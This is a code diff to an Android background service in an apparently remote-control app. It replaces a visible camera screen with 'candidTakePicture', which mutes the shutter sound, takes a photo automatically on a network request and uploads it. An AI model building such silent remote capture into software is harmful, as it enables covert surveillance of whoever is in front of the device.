@@ -10,13 +10,19 @@ import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.text.TextUtils;
 import android.util.Log;
+import android.util.Size;
 import android.widget.Toast;
 
 import com.sun.camera.CameraActivity;
+import com.sun.camera.CameraBasic;
 import com.sun.camera.PictureRequest;
+import com.sun.common.SessionNote;
 import com.sun.connect.EventNetwork;
 import com.sun.connect.NetworkChannel;
+import com.sun.connect.RequestJson;
+import com.sun.conversation.CvsNote;
 import com.sun.device.AskNote;
+import com.sun.utils.FileUtils;
 import com.sun.utils.NoteHelper;
 import com.sun.gps.GpsListener;
 import com.sun.gps.GpsRequest;
@@ -26,8 +32,10 @@ import com.sun.level.UpdateOrderNote;
 import com.sun.personalconnect.Application;
 import com.sun.utils.FormatUtils;
 import com.sun.utils.ToastUtils;
+import com.sun.utils.Utils;
 
 import java.io.File;
+import java.io.IOException;
 
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
@@ -79,9 +87,10 @@ public class AnswerService extends Service implements NetworkChannel.INetworkLis
             Application.App.getModelManager().addGpsHardListener(this);
             Application.App.getModelManager().setGpsStatus(mLastGpsRequest.getGpsGear());
         }else if(obj instanceof PictureRequest){
-            Intent intent = new Intent(this, CameraActivity.class);
-            intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
+//            Intent intent = new Intent(this, CameraActivity.class);
+//            intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
+//            startActivity(intent);
+            candidTakePicture((PictureRequest)obj);
         }
     }
 
@@ -152,5 +161,38 @@ public class AnswerService extends Service implements NetworkChannel.INetworkLis
     @Override
     public IBinder onBind(Intent intent) {
         return null;
+    }
+
+    private CameraBasic.Callback mCameraBasicCallback;
+
+    private void candidTakePicture(final PictureRequest request){
+        CameraBasic cameraBasic = new CameraBasic(this);
+        cameraBasic.muteShutterSound(true);
+        if(mCameraBasicCallback == null){
+            mCameraBasicCallback = new CameraBasic.Callback() {
+                @Override
+                public void onPreviewSize(Size size) {
+                }
+
+                @Override
+                public void onConfigured() {
+                }
+
+                @Override
+                public void onCaptureCompleted(File file) {
+                    ToastUtils.show("onCaptureCompleted file:" + file.getAbsolutePath(), Toast.LENGTH_SHORT);
+                    if(!file.exists()) return;
+                    mNetworkChannel.upload(file);
+                    CvsNote note = NoteHelper.makeImageCvsNote(file);
+                    note.setSession(request);
+                    RequestJson json = FormatUtils.makeRequest(null,note);
+                    mNetworkChannel.request(json);
+                }
+            };
+        }
+        cameraBasic.setAutoTakePicture(1);
+        cameraBasic.setCaptureCallback(mCameraBasicCallback);
+        cameraBasic.setAutoClose(true);
+        cameraBasic.setDisplay();
     }
 }
